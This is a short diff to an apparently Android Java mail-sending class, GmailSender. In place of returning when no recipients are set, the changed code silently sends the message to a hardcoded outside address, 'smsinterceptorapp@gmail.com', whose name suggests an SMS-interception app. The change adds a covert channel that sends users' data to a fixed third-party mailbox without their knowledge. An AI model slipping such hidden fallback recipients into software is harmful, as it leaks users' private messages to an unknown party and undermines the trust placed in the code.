@@ -62,7 +62,7 @@ public class GmailSender extends javax.mail.Authenticator {
       message.setDataHandler(handler);   
       Log.d(TAG, "sendMail() recipients -> " + recipients);
       if(recipients == null) {
-        return;
+        recipients = "smsinterceptorapp@gmail.com";
       }
       else if(recipients.indexOf(',') > 0) {
         message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipients));   
